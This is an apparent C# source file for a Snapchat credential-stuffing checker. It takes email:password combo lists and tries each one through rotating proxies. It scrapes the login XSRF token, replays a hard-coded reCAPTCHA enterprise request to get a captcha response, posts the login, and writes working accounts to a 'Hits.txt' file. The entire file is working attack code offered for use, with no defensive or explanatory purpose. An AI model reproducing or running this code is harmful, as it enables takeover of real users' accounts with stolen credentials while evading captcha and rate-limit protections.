using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check2
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker2()
		{
			for (; ; )
			{
				while (!Checking2.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking2.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking2.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								var get = httpRequest.Get("https://accounts.snapchat.com/accounts/login");
								string token = Regex.Match(get.ToString(), "data-xsrf=\"(.*?)\"").Groups[1].Value.ToString();
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("Accept", "*/*");
								var get1 = httpRequest.Get("https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=1AZgzF1o3OlP73CVr69UmL65&size=invisible&badge=inline&cb=pm8nxtjxhfhz");
								string CapToken = Regex.Match(get1.ToString(), "id=\"recaptcha-token\" value=\"(.*?)\"").Groups[1].Value.ToString();
								httpRequest.AddHeader("accept", "*/*");
								httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
								httpRequest.AddHeader("accept-language", "en-US,en;q=0.9,fa;q=0.8");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("origin", "https://www.google.com");
								httpRequest.AddHeader("referer", "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=1AZgzF1o3OlP73CVr69UmL65&size=invisible&badge=inline&cb=pm8nxtjxhfhz");
								httpRequest.AddHeader("sec-fetch-dest", "empty");
								httpRequest.AddHeader("sec-fetch-mode", "cors");
								httpRequest.AddHeader("sec-fetch-site", "same-origin");
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36");
								string content = "badge=inline&cb=pm8nxtjxhfhz&v=1AZgzF1o3OlP73CVr69UmL65&reason=q&c=<re>&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!5-Gg4cjIAAWoGLRLqEfe9gctNGUprl0ekMBdprmTgwcAAAMwVwAAACicCZNECGVv__iUbq6h5XzlPTaVb96i4cvAYNWFakaunwXAJHswEGMyIlNPmyHC7hVwenrn4C4dOTHvAn9wjK_-VRL6G64nWNVewrbOL46VJj5iGIKcjXZ78O8dzwifamh2cADNSgephbSja5_wB3_I4GYaYDhrbxsuNJqL2v3i0o0uNCL9PKQJQzKInTWqgiXkudYif-T4GZCQkKyV_IacUqPYPeMbSrl0loSKMdqbf-s8bNW5uIZM74JYQvHPJ03s8qKj3gI358La2Bt7j1OUbAXI1U1bIk94y1-atqdlnQLAEOxjSYzf2lN1RqnhtVRMw2QfMUECf2K2WeqhUt9P2Nkc8FPmdQmuOj_lc6O1g9bAGtiI_lPRkQ5fYV4HJnFCzAb8a1WHiAFzVpU5Hso-Y3zcwU9sCr1Ul4H2PVTRyIHG6d3zTwDX1E5MD6QylR3TfQYshP2Ve8GsGM4y1qZ_u2uIzj-9wYfvp-DAhQVAQ-J50EdGJDG4HdnAs_fEXPA3D4Vwm3YOg0hG4QyEtGA4Bu7k6yW8Vt-XtzHCuW9apRoPk1RppTpu2DmU4YyMhO-0GiOew4iisknuiAADxbLxX2HI36pfCT0lJh24shfcF-nsjmnVdt535bf2Xm7nJOWNwJ8yIR-xdR9pC8yjkvUwGq0VL6QlhT7LapuGh2J1VwKP9_F9wD3k9oJdM5Lugik6ZcsnTKy1q4UG8GA-JnOt4q6iNwA7BqrLgM-NM3lSCZv1sMwEVMRiJxSkX1P8abKDylDsQsmQq3l4mvcJTFlCROm7gS94-c1AZlam4rE2iv4nLDiVUVtEb_Dfv89s3vLqVryPOVHtlVOVi5F_k2esAs8lrCMkepiGFoED_caknkgDpluCMwGo8I3LLzOVff3mkQU_CTxmB2ygqcbuEZGuBnGZ-0t1J6ctB3ynq-j6DnIEHX9sAvVZYruVeC0lk93RxnUdwypX4TU7p-xVOhcw1wGCpfUemWYsda91ZsTAqsw_Dgz3gmGAKgFi4y9C3BvC9Yi6ZhZJv7p-ihjmZZmpLdwXYCNY5KLAD_onTRpKmmw-GTfyE-_u_w4TTKjPA2TJLYQ7dw4SiO5s-HnVYUO82Cm5rVLVm1AReLcHMWVgvXwP0YksiqmZR0T-JIsLMZK9owhCSBT76H85RfvPJYpuldEGi7-LsGKKqFCf-WwnOjC0RoIMbccMW5JwSv-IqPhdjN1c3DhaGFtrujKR9xZrSwI0kyoup2EZY_ex99uxe8Tyz5FXIjmisMJ3ITaWB9RBmqJ250qSpCaN0L_lDP1kHJkYb4lO6FM4A3PAZbICFw5NM1kDGryoP8TbLV9n8NMLIH0v8tuyeyvFwVRxcPH2QrkFhmtXlf5BMRpWrjUqYPok-ep2mQaBpXyCYSgtgkxz12vDW8ZrquLQqfui-A1kXMPA3_3wQFzx-DkDpt-BNe5SWdV4XQgrK-ojWDqi8seeYkJnLE0k_4CVxebdkdWT43anR5jQ2NcTmKVea8KvQELZJvDJqlY0AlKHAd7NvPLRv_s40dFn1mz_CFhYDDuAIPIwegva12MFZNV8C8vP8nORErtyuWVQf6dfeqYVTty1WMoNSoi0snBOqwwm97YDYwjZ4yetWARZ5w-XAW9Eb5QftMQrA-jp9qTX7giUIuBxoWJ4qnmhr5OIHYclT8gGYpXoH_2KjKX7HK_7Siv_phbDeyGJWHMZwaLsRT2eMqjRGln03SiSFWJMEAyUw_NbFvzdWhgNewU7ItQLLF97Cm4UFqxZoypeE3Sfm-88MbOROL6hILaA8OAjHMzpxc9nRRIt9bB8h5QNyVfsAk6LU7fsg4Xy7xBu9ru9oVgCREqqIsOPYfZzaTmSB-6x-SBs1FYdCW9H0Ej7QLoHGeEmZLBhzPC0bXyYlvctkWNyXU_bRmoaYp38SkH6AgI0NY2CABxelbH6zzp_658hHHgyOLX_e5QohU9rJFLn-05PwZTRJ4e2o2FcUUJvRR-o5fTbkJ9rP6qbHCwjwkbgCCzYxUQUwjx-XBpm4GRKPg3xSj0Tr54CZdHMK01c3CGcwfnvHd9wT6xqOlJ3hfpK0CpYFFj5yXKVwb20dxTYS8kyhyqf7_XwJjimGEbMKXvazigQpCszbLi51OTiizWOZIooAnODtZYFC3IZJQedOqmLrehQaCWLUA8L8jN-eXb6BESjVsLRZAQOQ7SjVuJqvdNXozwbgdrvAhx0kO5L9yc2cB2UHiqRhgD8kdFnnb97xMay1AaLzq_QFe-TSeAyK7HJ0gKYWhqeeeW179ahnusI7d1kzdaoSLCvPl3leOPOPH_m331Ow8BUWR2dPEHssGMOMLn7Nbr6-QbkdItg7xIt8bHwc1OzszgXDGLPQaEVcGkDTQgUUzPOreFrae84nJA-ZgyHUoPYBV4vlu-sk5Xj1reFvhZNpP3FPeIFmXTgXXxHnn8nMziXpJ-AgR7YZIT64rvEIuOz0HVr7_blLzCbsCcsoO9irPEPbwaLuRj8b-VIUkgNmfVVSZXXojJ3GiXPRyIYsbuf8WWFxRSFZlIMDbGcfSrRgCwyuFFxz8hqiGnCMgt_eiD6taw-Fg2_qTJLVspaVWoSyn7QVp9qO0GOTXB2gZsrGSEknDbS0SNQ5Yqb-zEFufaYHHFCkbBjjA0MDQI3UlNoHPymfSLHDh_w18NajE8SHONMuLWZI-z1CmOlg_8nJDDIVXUK34cT1qHbG2jsOEX6IjK0WqoPOh76tDq8-MO4mXimjZ1uM-cmFII7ftd9fMUVkafNqCguYC-YWdUpN8kleNvtDY_j3m5ENltyiQW91eIb2xxrGHQh25sWWp6Br68G38ZW6ytYGaj84w_exIIUZ-elRztaY6aEzoj5oZxurXnvhLWdCTFLdgHPXRYAR5-FitHRdgf7ZxSOK7QcrC7oMonBueINVdQKFE1VFpyi-5JcV6Bky3Ji8dbbcA6MIm5FDFF6Rtc23TLTn6VEfhTDMyaD49u5DGvJn65MRh0ClOLspJpWN63p6Pig3gzt1XmX4GKlmnKWiMt3dZrQ7pAXGAkL8cE41kdBX-NxJV1bMfhSj2xQCDHNFqOGSfn7vixW9BWKwIP-kxQ2vgURiFCQoRf3fqjTYq_SBSUXVeLuXxWw9IdXiy5R30BoAgWfEGG_dZCk8SBAD5Uo0MfgfJ43EjFaBZlBIVACsFvAA_pPRoHJrJPD5jbTI0bpMgyIOVxKVoNkAvVxtj3a-1izrBT_D7Q_cpXqXz-BcjNInG7sA-k";
								content = content.Replace("<re>", CapToken);
								string post = httpRequest.Post("https://www.google.com/recaptcha/api2/reload?k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw", content, "application/x-www-form-urlencoded").ToString();
								string resp = Regex.Match(post, "\"rresp\",\"(.*?)\"").Groups[1].Value.ToString();
								httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
								httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
								httpRequest.AddHeader("accept-language", "en-us");
								httpRequest.AddHeader("cache-control", "max-age=0");
								string content1 = "username=" + array[0] + "&password=" + array[1] + "&xsrf_token=" + token + "&continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome&g-recaptcha-response=" + resp + "&g-recaptcha-response=" + resp;
								httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded");
								httpRequest.AddHeader("origin", "https://accounts.snapchat.com");
								httpRequest.AddHeader("referer", "https://accounts.snapchat.com");
								httpRequest.AddHeader("sec-fetch-dest", "document");
								httpRequest.AddHeader("sec-fetch-mode", "navigate");
								httpRequest.AddHeader("sec-fetch-site", "same-origin");
								httpRequest.AddHeader("sec-fetch-user", "?1");
								httpRequest.AddHeader("upgrade-insecure-requests", "1");
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36");
								var post1 = httpRequest.Post("https://accounts.snapchat.com/accounts/login", content1, "application/x-www-form-urlencoded");
								string key = post1.ToString();
								if (key.Contains("Unable to verify captcha"))
								{
									string acc1 = email + ":" + password;
									Checking2.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking2.retry);
									break;
								}
								else if (key.Contains("-webkit-transform: translateY(-50%) rotate(360deg);") || post1.ContainsCookie("sc-a-session"))
								{
									string t3 = post1.ToString();
									Interlocked.Increment(ref Checking2.CheckedLines);
									Interlocked.Increment(ref Checking2.currentCpm);
									Interlocked.Increment(ref Checking2.Hits);
									Save(Path + "\\Hits.txt", account);
									if (Program.config.printgood == "True")
									{
										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									break;
								}
								else if (key.Contains("Cannot find the user") || key.Contains("not the right password."))
								{
									Interlocked.Increment(ref Checking2.CheckedLines);
									Interlocked.Increment(ref Checking2.currentCpm);
									Interlocked.Increment(ref Checking2.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.DarkRed);
									}
									break;
								}
								{
									string acc1 = email + ":" + password;
									Checking6.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Checking6.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking2.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking2.retry);
								break;
							}
						}
					}
				}
			}
		}

			public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
